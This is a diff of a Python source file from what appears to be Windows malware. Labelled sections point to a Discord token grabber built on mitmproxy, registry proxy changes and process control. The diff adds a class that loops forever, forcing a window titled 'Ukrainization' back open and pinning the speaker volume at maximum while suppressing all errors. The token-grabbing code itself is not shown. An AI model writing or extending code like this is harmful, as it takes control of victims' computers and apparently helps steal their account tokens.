@@ -1,46 +1,44 @@
-import threading
-import time
 import asyncio
-import os
-import logging
-import DiscordManager
-import LaunchingUkrainizaciya
-# ---------------------ProxySetup---------------------
-import winreg as reg
-
-# ----------------------------------------------------
-# ---------------------tokengraber---------------------
-import time
-
-from mitmproxy import options
-from mitmproxy.tools.dump import DumpMaster
-import asyncio
-import logging
-from mitmproxy.addonmanager import Loader
-
-# -----------------------------------------------------
-
-# ---------------------ImageController--------------------
-import pygame
-from PIL import Image
-import requests
-from io import BytesIO
 import ctypes
-# -------------------------------------------------------
-# ------------------------ProcessController---------------
-import psutil
+import logging
+import os
+import threading
 # --------------------------------------------------------
 # ------------------------LaunchingUkrainizaciya---------------
 import time
+# ---------------------ProxySetup---------------------
+import winreg as reg
+from ctypes import cast, POINTER
+from io import BytesIO
+
 import keyboard
-import threading
+# -------------------------------------------------------
+# ------------------------ProcessController---------------
+import psutil
+import pyautogui
+# ---------------------ImageController--------------------
+import pygame
+# --------------------------------------------------------
+# --------------------------WindowsController-------------
+import pygetwindow
+import requests
 import urllib3
-import os
-import win32security
 import win32api
 import win32con
-import pyautogui
-from WindowsController import WindowsController
+import win32security
+from PIL import Image
+from comtypes import CLSCTX_ALL
+from mitmproxy import options
+from mitmproxy.addonmanager import Loader
+from mitmproxy.tools.dump import DumpMaster
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+
+import DiscordManager
+import LaunchingUkrainizaciya
+
+# ----------------------------------------------------
+# ---------------------tokengraber---------------------
+# -----------------------------------------------------
 
 # ---------------------------------------------------
 
@@ -235,7 +233,28 @@ class ProcessController:
 
 
 # --------------------------------------------------------
+# --------------------------WindowsController-------------
 
+class WindowsController:
+    @classmethod
+    def restor_window(cls):
+        window = pygetwindow.getWindowsWithTitle("Ukrainization")[0]
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+
+        volume = cast(interface, POINTER(IAudioEndpointVolume))
+        while True:
+            try:
+                volume.SetMasterVolumeLevelScalar(1.0, None)
+                window.restore()
+            except:
+                time.sleep(1)
+                window = pygetwindow.getWindowsWithTitle("Ukrainization")[0]
+                devices = AudioUtilities.GetSpeakers()
+                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+
+                volume = cast(interface, POINTER(IAudioEndpointVolume))
+# --------------------------------------------------------
 # ------------------------LaunchingUkrainizaciya---------------
 
 
